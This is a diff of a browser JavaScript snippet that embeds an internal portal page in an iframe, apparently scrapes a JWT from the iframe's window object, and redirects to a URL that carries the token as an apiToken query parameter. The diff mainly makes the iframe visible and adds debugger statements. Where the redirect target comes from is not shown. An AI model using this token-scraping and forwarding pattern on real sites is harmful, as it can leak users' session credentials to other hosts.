@@ -1,10 +1,8 @@
 (function () {
   debugger;
- document.body.style.pointerEvents='auto';
-  document.body.style.touchAction='auto';  
-  
+
   // Step 1: Load vConsole from jsDelivr
-     let vConsoleScript = document.createElement('script');
+  let vConsoleScript = document.createElement('script');
   vConsoleScript.src = "https://cdn.jsdelivr.net/npm/vconsole@latest/dist/vconsole.min.js";
   document.head.appendChild(vConsoleScript);
 
@@ -13,13 +11,17 @@
     const vConsole = new window.VConsole();
     console.log('vConsole initialized'); // Confirmation message
 
-    // Step 3: Proceed with the iframe logic
+    // Step 3: Create and append the iframe
     let iframe = document.createElement('iframe');
-   // iframe.style.display = 'none';  // Make the iframe invisible
+    iframe.style.width = '100%';  // Make the iframe visible
+    iframe.style.height = '500px';  // Set a fixed height for visibility
     iframe.src = 'https://jarvis.geo.azure.myteksi.net/codeless-portal/page/EcdR6wFAjtOJqWrkFbmdy3g==';
     document.body.appendChild(iframe);
 
-    // Function to extract JWT from the iframe's window object
+    // Step 4: Add a debugger so you can inspect the iframe in DevTools
+    debugger;  // Allows you to pause and inspect the iframe object in the console
+
+    // Step 5: Function to extract JWT from iframe's window
     function extractJWTFromWindow(maxDepth = 50) {
       const seen = new WeakSet();
 
@@ -81,6 +83,7 @@
 
     let fullHref = `${redirectUrl}?apiToken=${encodeURIComponent(apiToken)}&name=${encodeURIComponent(name)}&noDelay=true`;
 
+    // Step 6: Keep iframe in the DOM but show error page or redirect
     if (missing.length) {
       const container = document.createElement("div");
       container.style =
@@ -97,6 +100,7 @@
 
     // Use the extracted token and redirect
     fullHref = fullHref.replace(apiToken, encodeURIComponent(apiToken));
+
     if (noDelay) {
       location.href = fullHref;
       return;
@@ -120,4 +124,3 @@
     }, 1000);
   };
 })();
-s
